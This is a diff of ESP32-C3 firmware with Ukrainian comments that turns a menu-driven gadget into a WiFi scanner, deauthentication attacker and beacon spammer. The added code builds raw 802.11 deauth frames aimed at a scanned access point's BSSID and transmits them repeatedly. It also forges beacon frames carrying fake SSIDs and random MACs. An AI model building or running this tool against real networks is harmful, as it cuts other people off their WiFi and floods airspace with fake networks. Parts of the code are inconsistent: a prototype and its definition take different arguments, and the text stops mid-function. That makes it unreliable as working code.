@@ -1,632 +1,725 @@
 /*
- * RF TOOL v6.0 - Wi-Fi Only (Bruce Style UI)
- * ESP32-C3 Supermini
- * - Справжнє скроловане меню (як у смартфоні)
- * - Виправлений Beacon Spammer
- * - Правильне відображення списків
+ * Bruce Gadget для ESP32-C3 SuperMini
+ * WiFi Scanner, Deauth Attack, Beacon Spammer
+ * Дисплей: ST7735 160x80 (INITR_MINI160x80)
  */
 
 #include <SPI.h>
 #include <Adafruit_GFX.h>
 #include <Adafruit_ST7735.h>
 #include <WiFi.h>
-#include <esp_wifi.h>
+#include "esp_wifi.h"
 
-// ====================== Піни ======================
-#define TFT_CS      5
-#define TFT_DC      6
-#define TFT_RST     7
-#define TFT_MOSI    10
-#define TFT_SCLK    8
+// ===== ПІНИ ДИСПЛЕЮ =====
+#define TFT_CS   5
+#define TFT_DC   6
+#define TFT_RST  7
+#define TFT_SCK  8
+#define TFT_MOSI 10
 
-#define BTN_UP      1
-#define BTN_DOWN    20
-#define BTN_SEL     3
-#define BTN_BACK    0
+// ===== ПІНИ КНОПОК =====
+#define BTN_UP   1
+#define BTN_DOWN 20
+#define BTN_SEL  3
+#define BTN_BACK 0
 
-// ====================== Кольори ======================
-#define BG_COLOR        ST77XX_BLACK
-#define HEADER_COLOR    ST77XX_CYAN
-#define SELECTED_COLOR  ST77XX_YELLOW
-#define TEXT_COLOR      ST77XX_WHITE
-#define ALERT_COLOR     ST77XX_RED
-#define SUCCESS_COLOR   ST77XX_GREEN
-#define LINE_COLOR      ST77XX_BLUE
+// ===== КОЛЬОРИ (стиль Bruce) =====
+#define CLR_BG       ST77XX_BLACK
+#define CLR_HEADER   ST77XX_CYAN
+#define CLR_SELECT   ST77XX_YELLOW
+#define CLR_TEXT     ST77XX_WHITE
+#define CLR_DANGER   ST77XX_RED
+#define CLR_SUCCESS  0x07E0  // зелений
+#define CLR_DIM      0x4208  // темно-сірий
+#define CLR_ACCENT   0xFD20  // помаранчевий
 
-// ====================== Об'єкти ======================
-Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);
+// ===== РОЗМІРИ ДИСПЛЕЮ =====
+#define SCREEN_W  160
+#define SCREEN_H  80
+#define HEADER_H  14
+#define FOOTER_H  11
+#define ITEM_H    11
+#define CONTENT_Y (HEADER_H + 2)
+#define CONTENT_H (SCREEN_H - HEADER_H - FOOTER_H - 4)
+#define VISIBLE_ITEMS (CONTENT_H / ITEM_H)  // ~5
 
-// ====================== Стани меню ======================
+// ===== СТАНИ ДОДАТКУ =====
 enum AppState {
-  MAIN_MENU,
-  WIFI_SCAN,
-  WIFI_DEAUTH,
-  WIFI_BEACON,
-  SETTINGS
+  STATE_MAIN_MENU,
+  STATE_WIFI_SCAN,
+  STATE_WIFI_LIST,
+  STATE_DEAUTH,
+  STATE_BEACON_MENU,
+  STATE_BEACON_RUN,
+  STATE_SETTINGS
 };
 
-AppState currentState = MAIN_MENU;
+// ===== ГЛОБАЛЬНІ ЗМІННІ =====
+Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);
 
-// Головне меню
-const char* mainMenuItems[] = {"Wi-Fi Scan", "Deauth", "Beacon Spam", "Settings"};
-const uint8_t mainMenuSize = 4;
-int8_t mainMenuIndex = 0;
+AppState currentState = STATE_MAIN_MENU;
 
-// Налаштування Beacon
-const char* beaconSSIDs[] = {"FREE_WiFi", "AndroidAP", "iPhone", "Starbucks_WiFi", "McDonalds Free"};
-const uint8_t beaconCount = 5;
-uint8_t beaconIndex = 0;
-bool beaconActive = false;
+// Меню
+int menuCursor   = 0;  // індекс виділеного елементу
+int menuScroll   = 0;  // зсув скролу
+int menuSize     = 0;  // кількість елементів
 
-// Wi-Fi дані
-int apCount = 0;
-String apList[50];
-uint8_t apBSSID[50][6];
-int apChannel[50];
-int selectedAP = 0;
+// WiFi
+#define MAX_NETWORKS 20
+struct WifiNet {
+  char ssid[33];
+  int  channel;
+  int  rssi;
+  uint8_t bssid[6];
+};
+WifiNet networks[MAX_NETWORKS];
+int networkCount = 0;
+int selectedNet  = -1;
 
-// Стани атак
-bool deauthActive = false;
-unsigned long lastPacket = 0;
-unsigned long packetCount = 0;
+// Deauth
+bool deauthRunning = false;
+unsigned long deauthCount = 0;
+unsigned long lastDeauth  = 0;
 
-// ====================== Прототипи функцій ======================
+// Beacon
+#define BEACON_SSID_COUNT 8
+const char* beaconSSIDs[] = {
+  "FBI Surveillance Van",
+  "CIA Operations",
+  "NSA Mobile Unit",
+  "Get Your Own WiFi",
+  "Virus.exe",
+  "Not Your Network",
+  "SkyNet Node 1",
+  "Free_5G_COVID"
+};
+bool beaconRunning    = false;
+unsigned long beaconCount = 0;
+unsigned long lastBeacon  = 0;
+int beaconSelected    = 0;
+
+// Кнопки
+unsigned long lastBtnTime[4] = {0, 0, 0, 0};
+#define DEBOUNCE_MS 170
+
+// Прототипи функцій
 void drawHeader(const char* title);
+void drawFooter(const char* hints);
 void drawMainMenu();
-void drawWiFiScanList();
-void drawWiFiDeauthScreen();
-void drawBeaconScreen();
-void drawSettingsScreen();
-void drawButtonHints(const char* hints);
+void drawWifiScanScreen();
+void drawWifiList();
+void drawDeauthScreen();
+void drawBeaconMenu();
+void drawBeaconRun();
+void drawScrollList(const char** items, int count, int cursor, int scroll, int y, int maxVisible);
 void handleNavigation();
-void startWiFiScan();
+bool btnPressed(int pin, int idx);
+void doWifiScan();
+void sendDeauthPacket(uint8_t* bssid, uint8_t* client);
+void sendBeaconPacket(const char* ssid);
 void startDeauth();
 void stopDeauth();
 void startBeacon();
 void stopBeacon();
-void sendBeaconPacket(const char* ssid);
-void sendDeauthPacket(uint8_t* bssid, int channel);
+String rssiToBar(int rssi);
 
-// ====================== Setup ======================
-void setup() {
-  Serial.begin(115200);
-  delay(500);
+// ===== МАЛЮВАННЯ ІНТЕРФЕЙСУ =====
 
-  pinMode(BTN_UP, INPUT_PULLUP);
-  pinMode(BTN_DOWN, INPUT_PULLUP);
-  pinMode(BTN_SEL, INPUT_PULLUP);
-  pinMode(BTN_BACK, INPUT_PULLUP);
-
-  SPI.begin(TFT_SCLK, -1, TFT_MOSI);
-
-  tft.initR(INITR_MINI160x80);
-  tft.setRotation(1);
-  tft.fillScreen(BG_COLOR);
-  tft.setTextWrap(false);
-
-  tft.setTextColor(SUCCESS_COLOR);
-  tft.setCursor(10, 20);
-  tft.print("TFT OK!");
-  
-  tft.setTextColor(TEXT_COLOR);
-  tft.setCursor(10, 35);
-  tft.print("Wi-Fi init...");
-
-  WiFi.mode(WIFI_STA);
-  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
-  esp_wifi_set_ps(WIFI_PS_NONE);
-  
-  tft.setTextColor(SUCCESS_COLOR);
-  tft.setCursor(10, 50);
-  tft.print("Ready!");
-
-  delay(1000);
-  drawMainMenu();
-}
-
-// ====================== Головний цикл ======================
-void loop() {
-  handleNavigation();
-
-  // Deauth attack
-  if (currentState == WIFI_DEAUTH && deauthActive) {
-    if (millis() - lastPacket >= 5) {
-      lastPacket = millis();
-      sendDeauthPacket(apBSSID[selectedAP], apChannel[selectedAP]);
-      packetCount++;
-    }
-  }
-
-  // Beacon spam
-  if (currentState == WIFI_BEACON && beaconActive) {
-    static unsigned long lastBeacon = 0;
-    static unsigned long lastDisplayUpdate = 0;
-    static unsigned long beaconCount_local = 0;
-    
-    if (millis() - lastBeacon >= 50) {
-      lastBeacon = millis();
-      sendBeaconPacket(beaconSSIDs[beaconIndex]);
-      beaconCount_local++;
-    }
-    
-    if (millis() - lastDisplayUpdate >= 500) {
-      lastDisplayUpdate = millis();
-      packetCount = beaconCount_local;
-      // Оновлюємо тільки лічильник
-      tft.fillRect(10, 85, 140, 15, BG_COLOR);
-      tft.setCursor(10, 85);
-      tft.setTextColor(TEXT_COLOR);
-      tft.print("Sent: ");
-      tft.print(packetCount);
-    }
-  }
-
-  delay(5);
-}
-
-// ====================== Функції малювання ======================
 void drawHeader(const char* title) {
-  tft.fillRect(0, 0, 160, 15, HEADER_COLOR);
-  tft.setTextColor(BG_COLOR);
+  tft.fillRect(0, 0, SCREEN_W, HEADER_H, CLR_HEADER);
+  tft.setTextColor(CLR_BG);
   tft.setTextSize(1);
-  tft.setCursor(3, 4);
+  // Центруємо заголовок
+  int len = strlen(title);
+  int x = (SCREEN_W - len * 6) / 2;
+  tft.setCursor(x, 3);
   tft.print(title);
-  tft.drawFastHLine(0, 15, 160, LINE_COLOR);
 }
 
-void drawButtonHints(const char* hints) {
-  tft.fillRect(0, 145, 160, 15, BG_COLOR);
-  tft.setTextColor(ST77XX_CYAN);
+void drawFooter(const char* hints) {
+  int y = SCREEN_H - FOOTER_H;
+  tft.fillRect(0, y, SCREEN_W, FOOTER_H, 0x1082);
+  tft.setTextColor(CLR_DIM);
   tft.setTextSize(1);
-  tft.setCursor(2, 148);
+  tft.setCursor(2, y + 2);
   tft.print(hints);
 }
 
+void drawScrollList(const char** items, int count, int cursor, int scroll, int startY, int maxVisible) {
+  for (int i = 0; i < maxVisible; i++) {
+    int idx = scroll + i;
+    if (idx >= count) break;
+    int y = startY + i * ITEM_H;
+    if (idx == cursor) {
+      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_SELECT);
+      tft.setTextColor(CLR_BG);
+    } else {
+      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_BG);
+      tft.setTextColor(CLR_TEXT);
+    }
+    tft.setTextSize(1);
+    tft.setCursor(4, y + 2);
+    tft.print(items[idx]);
+  }
+}
+
+// ===== ГОЛОВНЕ МЕНЮ =====
+const char* mainMenuItems[] = {
+  " WiFi Scanner",
+  " Deauth Attack",
+  " Beacon Spam",
+  " Settings"
+};
+const int MAIN_MENU_SIZE = 4;
+
 void drawMainMenu() {
-  tft.fillScreen(BG_COLOR);
-  drawHeader("RF TOOL v6.0");
-  
-  const char* icons[] = {"[S]", "[D]", "[B]", "[#]"};
-  
-  // Фіксована позиція курсора - завжди другий рядок
-  const int CURSOR_Y = 42;
-  
-  // Визначаємо зміщення списку
-  int scrollOffset = 0;
-  if (mainMenuIndex > 1) scrollOffset = mainMenuIndex - 1;
-  if (scrollOffset > mainMenuSize - 3) scrollOffset = mainMenuSize - 3;
-  
-  // Малюємо видимі пункти (максимум 3)
-  for (int i = scrollOffset; i < mainMenuSize && i < scrollOffset + 3; i++) {
-    int displayIndex = i - scrollOffset;
-    int y = 25 + displayIndex * 25;
-    
-    if (i == mainMenuIndex) {
-      // Виділений пункт
-      tft.fillRoundRect(5, y-2, 150, 20, 4, SELECTED_COLOR);
-      tft.setTextColor(BG_COLOR);
+  tft.fillScreen(CLR_BG);
+  drawHeader("[ BRUCE v1.0 ]");
+
+  for (int i = 0; i < MAIN_MENU_SIZE; i++) {
+    int idx = menuScroll + i;
+    if (idx >= MAIN_MENU_SIZE) break;
+    int y = CONTENT_Y + i * ITEM_H;
+
+    if (idx == menuCursor) {
+      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_SELECT);
+      tft.setTextColor(CLR_BG);
     } else {
-      tft.setTextColor(TEXT_COLOR);
+      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_BG);
+      tft.setTextColor(CLR_TEXT);
     }
-    tft.setCursor(15, y);
-    tft.print(icons[i]);
-    tft.setCursor(40, y);
-    tft.print(mainMenuItems[i]);
+    tft.setTextSize(1);
+    tft.setCursor(6, y + 2);
+    // Іконки
+    switch(idx) {
+      case 0: tft.setTextColor(idx == menuCursor ? CLR_BG : 0x07FF); break;
+      case 1: tft.setTextColor(idx == menuCursor ? CLR_BG : CLR_DANGER); break;
+      case 2: tft.setTextColor(idx == menuCursor ? CLR_BG : CLR_ACCENT); break;
+      case 3: tft.setTextColor(idx == menuCursor ? CLR_BG : CLR_DIM); break;
+    }
+    tft.print(mainMenuItems[idx]);
   }
-  
-  drawButtonHints("UP/DN:nav  SEL:enter");
+
+  // Смуга прокрутки
+  if (MAIN_MENU_SIZE > VISIBLE_ITEMS) {
+    int barH = CONTENT_H * VISIBLE_ITEMS / MAIN_MENU_SIZE;
+    int barY = CONTENT_Y + CONTENT_H * menuScroll / MAIN_MENU_SIZE;
+    tft.fillRect(SCREEN_W - 3, CONTENT_Y, 3, CONTENT_H, CLR_DIM);
+    tft.fillRect(SCREEN_W - 3, barY, 3, barH, CLR_HEADER);
+  }
+
+  drawFooter("UP/DN:nav  SEL:select");
 }
 
-void startWiFiScan() {
-  tft.fillScreen(BG_COLOR);
-  drawHeader("Scanning...");
-  tft.setTextColor(TEXT_COLOR);
-  tft.setCursor(10, 40);
-  tft.print("Searching APs...");
-  
-  apCount = WiFi.scanNetworks();
-  
-  for (int i = 0; i < apCount && i < 50; i++) {
-    apList[i] = WiFi.SSID(i);
-    if (apList[i].length() == 0) apList[i] = "[Hidden Network]";
-    apChannel[i] = WiFi.channel(i);
-    memcpy(apBSSID[i], WiFi.BSSID(i), 6);
+// ===== WiFi СКАНЕР =====
+void drawWifiScanScreen() {
+  tft.fillScreen(CLR_BG);
+  drawHeader("[ WiFi SCAN ]");
+  tft.setTextColor(CLR_HEADER);
+  tft.setTextSize(1);
+  tft.setCursor(20, 30);
+  tft.print("Scanning...");
+  tft.setCursor(10, 45);
+  tft.setTextColor(CLR_DIM);
+  tft.print("Please wait");
+  drawFooter("");
+}
+
+void doWifiScan() {
+  drawWifiScanScreen();
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+
+  int n = WiFi.scanNetworks(false, true, false, 200);
+  networkCount = 0;
+
+  if (n > 0) {
+    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
+      strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 32);
+      networks[i].ssid[32] = 0;
+      networks[i].channel  = WiFi.channel(i);
+      networks[i].rssi     = WiFi.RSSI(i);
+      memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
+      networkCount++;
+    }
   }
+
   WiFi.scanDelete();
-  
-  selectedAP = 0;
-  drawWiFiScanList();
+  menuCursor = 0;
+  menuScroll = 0;
+  menuSize   = networkCount;
+  currentState = STATE_WIFI_LIST;
+  drawWifiList();
 }
 
-void drawWiFiScanList() {
-  tft.fillScreen(BG_COLOR);
-  
-  char header[20];
-  snprintf(header, 20, "APs: %d", apCount);
-  drawHeader(header);
-  
-  if (apCount == 0) {
-    tft.setTextColor(ALERT_COLOR);
-    tft.setCursor(10, 40);
-    tft.print("No networks found");
-    drawButtonHints("BACK:return");
+void drawWifiList() {
+  tft.fillScreen(CLR_BG);
+  drawHeader("[ WiFi LIST ]");
+
+  if (networkCount == 0) {
+    tft.setTextColor(CLR_DANGER);
+    tft.setTextSize(1);
+    tft.setCursor(20, 35);
+    tft.print("No networks found!");
+    drawFooter("BACK:back");
     return;
   }
-  
-  // Визначаємо зміщення для скролу
-  int scrollOffset = 0;
-  if (selectedAP > 2) scrollOffset = selectedAP - 2;
-  if (scrollOffset > apCount - 5) scrollOffset = apCount - 5;
-  if (scrollOffset < 0) scrollOffset = 0;
-  
-  // Малюємо видимі мережі (максимум 8)
-  for (int i = scrollOffset; i < apCount && i < scrollOffset + 8; i++) {
-    int y = 20 + (i - scrollOffset) * 14;
-    if (y > 140) break;
-    
-    if (i == selectedAP) {
-      tft.fillRect(3, y-2, 154, 13, SELECTED_COLOR);
-      tft.setTextColor(BG_COLOR);
+
+  int visible = min(VISIBLE_ITEMS, networkCount);
+  for (int i = 0; i < visible; i++) {
+    int idx = menuScroll + i;
+    if (idx >= networkCount) break;
+    int y = CONTENT_Y + i * ITEM_H;
+
+    bool selected = (idx == menuCursor);
+    if (selected) {
+      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_SELECT);
+      tft.setTextColor(CLR_BG);
     } else {
-      tft.setTextColor(TEXT_COLOR);
+      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_BG);
+      // Колір по силі сигналу
+      if (networks[idx].rssi > -60)      tft.setTextColor(CLR_SUCCESS);
+      else if (networks[idx].rssi > -80) tft.setTextColor(CLR_ACCENT);
+      else                               tft.setTextColor(CLR_DIM);
     }
-    tft.setCursor(5, y);
-    
-    // Скорочуємо довгі імена
-    String displayName = apList[i];
-    if (displayName.length() > 14) {
-      displayName = displayName.substring(0, 12) + "..";
-    }
-    tft.print(displayName);
-    
-    // Додаємо канал
-    tft.print(" [");
-    tft.print(apChannel[i]);
-    tft.print("]");
+    tft.setTextSize(1);
+    tft.setCursor(2, y + 2);
+
+    // SSID обрізаємо до 18 символів
+    char line[32];
+    char shortSSID[19];
+    strncpy(shortSSID, networks[idx].ssid, 18);
+    shortSSID[18] = 0;
+    snprintf(line, sizeof(line), "%s [%d]", shortSSID, networks[idx].channel);
+    tft.print(line);
   }
-  
-  drawButtonHints("UP/DN:nav  SEL:select  BACK:back");
+
+  // Скролбар
+  if (networkCount > VISIBLE_ITEMS) {
+    int barH = max(4, CONTENT_H * VISIBLE_ITEMS / networkCount);
+    int barY = CONTENT_Y + (CONTENT_H - barH) * menuScroll / max(1, networkCount - VISIBLE_ITEMS);
+    tft.fillRect(SCREEN_W - 3, CONTENT_Y, 3, CONTENT_H, CLR_DIM);
+    tft.fillRect(SCREEN_W - 3, barY, 3, barH, CLR_HEADER);
+  }
+
+  drawFooter("UP/DN:nav SEL:deauth BK:back");
 }
 
-void drawWiFiDeauthScreen() {
-  tft.fillScreen(BG_COLOR);
-  drawHeader("Deauth Attack");
-  
-  if (apCount == 0) {
-    tft.setTextColor(ALERT_COLOR);
-    tft.setCursor(10, 40);
-    tft.print("No AP selected!");
-    tft.setCursor(10, 55);
-    tft.print("Run scan first!");
-    drawButtonHints("BACK:return");
-    return;
-  }
-  
-  tft.setTextColor(ALERT_COLOR);
-  tft.setCursor(5, 25);
-  tft.print("Target:");
-  
-  tft.setTextColor(TEXT_COLOR);
-  tft.setCursor(5, 40);
-  String displayName = apList[selectedAP];
-  if (displayName.length() > 18) {
-    displayName = displayName.substring(0, 16) + "..";
-  }
-  tft.print(displayName);
-  
-  tft.setCursor(5, 55);
-  tft.print("Channel: ");
-  tft.print(apChannel[selectedAP]);
-  
-  tft.setTextColor(deauthActive ? SUCCESS_COLOR : TEXT_COLOR);
-  tft.setCursor(5, 75);
-  tft.print("Status: ");
-  tft.print(deauthActive ? "ACTIVE" : "Idle");
-  
-  if (deauthActive) {
-    tft.setCursor(5, 90);
-    tft.print("Packets: ");
-    tft.print(packetCount);
+// ===== DEAUTH =====
+void drawDeauthScreen() {
+  tft.fillScreen(CLR_BG);
+  drawHeader("[ DEAUTH ]");
+
+  if (selectedNet < 0 || selectedNet >= networkCount) return;
+
+  // Назва мережі
+  tft.setTextColor(CLR_HEADER);
+  tft.setTextSize(1);
+  tft.setCursor(2, CONTENT_Y + 2);
+  char shortSSID[22];
+  strncpy(shortSSID, networks[selectedNet].ssid, 21);
+  shortSSID[21] = 0;
+  tft.print(shortSSID);
+
+  // BSSID
+  tft.setTextColor(CLR_DIM);
+  tft.setCursor(2, CONTENT_Y + 13);
+  char bssidStr[20];
+  uint8_t* b = networks[selectedNet].bssid;
+  snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+           b[0], b[1], b[2], b[3], b[4], b[5]);
+  tft.print(bssidStr);
+
+  // Статус
+  if (deauthRunning) {
+    tft.setTextColor(CLR_DANGER);
+    tft.setCursor(2, CONTENT_Y + 26);
+    tft.print(">>> ATTACKING <<<");
+    tft.setTextColor(CLR_TEXT);
+    tft.setCursor(2, CONTENT_Y + 38);
+    char cntStr[24];
+    snprintf(cntStr, sizeof(cntStr), "Pkts: %lu", deauthCount);
+    tft.print(cntStr);
   } else {
-    tft.setCursor(5, 90);
-    tft.print("Press SEL to start");
+    tft.setTextColor(CLR_SUCCESS);
+    tft.setCursor(2, CONTENT_Y + 26);
+    tft.print("Ready. SEL to start");
   }
-  
-  drawButtonHints("SEL:start/stop  BACK:back");
+
+  drawFooter(deauthRunning ? "SEL:stop  BACK:back" : "SEL:start BACK:back");
 }
 
-void drawBeaconScreen() {
-  tft.fillScreen(BG_COLOR);
-  drawHeader("Beacon Spammer");
-  
-  tft.setTextColor(TEXT_COLOR);
-  tft.setCursor(5, 25);
-  tft.print("SSID:");
-  
-  // Виділяємо SSID
-  tft.setTextColor(SELECTED_COLOR);
-  tft.setCursor(5, 40);
-  String displayName = beaconSSIDs[beaconIndex];
-  if (displayName.length() > 18) {
-    displayName = displayName.substring(0, 16) + "..";
-  }
-  tft.print(displayName);
-  
-  tft.setTextColor(TEXT_COLOR);
-  tft.setCursor(5, 60);
-  tft.print("Status: ");
-  if (beaconActive) {
-    tft.setTextColor(SUCCESS_COLOR);
-    tft.print("SPAMMING");
-  } else {
-    tft.setTextColor(TEXT_COLOR);
-    tft.print("Idle");
-  }
-  
-  tft.setTextColor(TEXT_COLOR);
-  tft.setCursor(5, 80);
-  tft.print("Sent: ");
-  tft.print(packetCount);
-  
-  drawButtonHints("SEL:start/stop  L/R:SSID  BACK:back");
+// Deauth пакет (802.11 deauthentication frame)
+uint8_t deauthPacket[26] = {
+  0xC0, 0x00,             // Frame Control: deauth
+  0x3A, 0x01,             // Duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+  0xF0, 0xFF,             // Sequence
+  0x07, 0x00              // Reason: Class 3 frame
+};
+
+void sendDeauthPacket(uint8_t* bssid) {
+  // Встановлюємо BSSID у пакет
+  memcpy(&deauthPacket[10], bssid, 6);
+  memcpy(&deauthPacket[16], bssid, 6);
+
+  esp_wifi_set_channel(networks[selectedNet].channel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+  // Також на AP інтерфейс
+  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
 }
 
-void drawSettingsScreen() {
-  tft.fillScreen(BG_COLOR);
-  drawHeader("Settings");
-  
-  tft.setTextColor(TEXT_COLOR);
-  tft.setCursor(5, 25);
-  tft.print("Select Beacon SSID:");
-  
-  // Показуємо список SSID зі скролом
-  int scrollOffset = 0;
-  if (beaconIndex > 2) scrollOffset = beaconIndex - 2;
-  if (scrollOffset > beaconCount - 5) scrollOffset = beaconCount - 5;
-  if (scrollOffset < 0) scrollOffset = 0;
-  
-  for (int i = scrollOffset; i < beaconCount && i < scrollOffset + 6; i++) {
-    int y = 40 + (i - scrollOffset) * 15;
-    if (y > 135) break;
-    
-    if (i == beaconIndex) {
-      tft.fillRoundRect(5, y-2, 150, 14, 4, SELECTED_COLOR);
-      tft.setTextColor(BG_COLOR);
-    } else {
-      tft.setTextColor(TEXT_COLOR);
-    }
-    tft.setCursor(10, y);
-    
-    String displayName = beaconSSIDs[i];
-    if (displayName.length() > 16) {
-      displayName = displayName.substring(0, 14) + "..";
-    }
-    tft.print(displayName);
-  }
-  
-  drawButtonHints("UP/DN:select  BACK:back");
-}
-
-// ====================== Функції атак ======================
 void startDeauth() {
-  deauthActive = true;
-  packetCount = 0;
-  esp_wifi_set_channel(apChannel[selectedAP], WIFI_SECOND_CHAN_NONE);
-  drawWiFiDeauthScreen();
+  if (selectedNet < 0) return;
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  esp_wifi_set_mode(WIFI_MODE_APSTA);
+  esp_wifi_start();
+  deauthRunning = true;
+  deauthCount   = 0;
+  drawDeauthScreen();
 }
 
 void stopDeauth() {
-  deauthActive = false;
-  drawWiFiDeauthScreen();
+  deauthRunning = false;
+  WiFi.mode(WIFI_STA);
+  drawDeauthScreen();
+}
+
+// ===== BEACON SPAMMER =====
+void drawBeaconMenu() {
+  tft.fillScreen(CLR_BG);
+  drawHeader("[ BEACON SPAM ]");
+
+  int visible = min(VISIBLE_ITEMS, BEACON_SSID_COUNT);
+  for (int i = 0; i < visible; i++) {
+    int idx = menuScroll + i;
+    if (idx >= BEACON_SSID_COUNT) break;
+    int y = CONTENT_Y + i * ITEM_H;
+
+    if (idx == menuCursor) {
+      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_SELECT);
+      tft.setTextColor(CLR_BG);
+    } else {
+      tft.fillRect(0, y, SCREEN_W, ITEM_H, CLR_BG);
+      tft.setTextColor(CLR_ACCENT);
+    }
+    tft.setTextSize(1);
+    tft.setCursor(4, y + 2);
+    tft.print(beaconSSIDs[idx]);
+  }
+
+  drawFooter("UP/DN:nav SEL:start BK:back");
+}
+
+void drawBeaconRun() {
+  tft.fillScreen(CLR_BG);
+  drawHeader("[ BEACONING ]");
+
+  tft.setTextColor(CLR_ACCENT);
+  tft.setTextSize(1);
+  tft.setCursor(2, CONTENT_Y + 2);
+  tft.print(beaconSSIDs[beaconSelected]);
+
+  tft.setTextColor(CLR_DANGER);
+  tft.setCursor(2, CONTENT_Y + 15);
+  tft.print(">>> SPAMMING <<<");
+
+  tft.setTextColor(CLR_TEXT);
+  tft.setCursor(2, CONTENT_Y + 28);
+  char cntStr[24];
+  snprintf(cntStr, sizeof(cntStr), "Pkts sent: %lu", beaconCount);
+  tft.print(cntStr);
+
+  drawFooter("SEL:stop  BACK:back");
+}
+
+// Beacon frame
+void sendBeaconPacket(const char* ssid) {
+  uint8_t ssidLen = strlen(ssid);
+
+  // Випадковий MAC
+  uint8_t mac[6];
+  for (int i = 0; i < 6; i++) mac[i] = random(0, 256);
+  mac[0] = (mac[0] & 0xFE) | 0x02; // локальний MAC
+
+  uint8_t pkt[100];
+  memset(pkt, 0, sizeof(pkt));
+  int pos = 0;
+
+  // Frame control: beacon
+  pkt[pos++] = 0x80; pkt[pos++] = 0x00;
+  // Duration
+  pkt[pos++] = 0x00; pkt[pos++] = 0x00;
+  // Destination: broadcast
+  memset(&pkt[pos], 0xFF, 6); pos += 6;
+  // Source: випадковий MAC
+  memcpy(&pkt[pos], mac, 6); pos += 6;
+  // BSSID: той самий MAC
+  memcpy(&pkt[pos], mac, 6); pos += 6;
+  // Sequence
+  pkt[pos++] = 0x00; pkt[pos++] = 0x00;
+  // Timestamp (8 байт)
+  uint64_t ts = esp_timer_get_time();
+  memcpy(&pkt[pos], &ts, 8); pos += 8;
+  // Beacon interval
+  pkt[pos++] = 0x64; pkt[pos++] = 0x00;
+  // Capabilities
+  pkt[pos++] = 0x01; pkt[pos++] = 0x04;
+  // SSID IE
+  pkt[pos++] = 0x00;
+  pkt[pos++] = ssidLen;
+  memcpy(&pkt[pos], ssid, ssidLen); pos += ssidLen;
+  // Supported rates IE
+  pkt[pos++] = 0x01; pkt[pos++] = 0x08;
+  pkt[pos++] = 0x82; pkt[pos++] = 0x84;
+  pkt[pos++] = 0x8B; pkt[pos++] = 0x96;
+  pkt[pos++] = 0x24; pkt[pos++] = 0x30;
+  pkt[pos++] = 0x48; pkt[pos++] = 0x6C;
+  // DS Parameter (канал)
+  pkt[pos++] = 0x03; pkt[pos++] = 0x01;
+  pkt[pos++] = 1 + random(0, 11);
+
+  esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false);
 }
 
 void startBeacon() {
-  beaconActive = true;
-  packetCount = 0;
-  drawBeaconScreen();
+  beaconSelected = menuCursor;
+  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+  esp_wifi_init(&cfg);
+  esp_wifi_set_storage(WIFI_STORAGE_RAM);
+  esp_wifi_set_mode(WIFI_MODE_AP);
+  esp_wifi_start();
+  beaconRunning = true;
+  beaconCount   = 0;
+  currentState  = STATE_BEACON_RUN;
+  drawBeaconRun();
 }
 
 void stopBeacon() {
-  beaconActive = false;
-  drawBeaconScreen();
+  beaconRunning = false;
+  WiFi.mode(WIFI_STA);
+  currentState = STATE_BEACON_MENU;
+  menuCursor   = beaconSelected;
+  menuScroll   = 0;
+  menuSize     = BEACON_SSID_COUNT;
+  drawBeaconMenu();
 }
 
-void sendDeauthPacket(uint8_t* bssid, int channel) {
-  uint8_t packet[26] = {
-    0xC0, 0x00, 0x00, 0x00,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
-    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
-    0x00, 0x00, 0x01, 0x00
-  };
-  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+// ===== КНОПКИ =====
+bool btnPressed(int pin, int idx) {
+  if (millis() - lastBtnTime[idx] < DEBOUNCE_MS) return false;
+  if (digitalRead(pin) == LOW) {
+    lastBtnTime[idx] = millis();
+    return true;
+  }
+  return false;
 }
 
-void sendBeaconPacket(const char* ssid) {
-  // Спрощена версія Beacon frame
-  uint8_t packet[64];
-  int ssidLen = strlen(ssid);
-  
-  // Заповнюємо нулями
-  memset(packet, 0, 64);
-  
-  // Frame Control (Beacon)
-  packet[0] = 0x80;
-  packet[1] = 0x00;
-  
-  // Duration
-  packet[2] = 0x00;
-  packet[3] = 0x00;
-  
-  // Destination (Broadcast)
-  for (int i = 4; i < 10; i++) packet[i] = 0xFF;
-  
-  // Source (Random MAC)
-  for (int i = 10; i < 16; i++) packet[i] = random(0, 255);
-  packet[10] &= 0xFE; // Unicast bit = 0
-  
-  // BSSID (same as source)
-  memcpy(packet + 16, packet + 10, 6);
-  
-  // Sequence control
-  packet[22] = random(0, 255);
-  packet[23] = random(0, 255);
-  
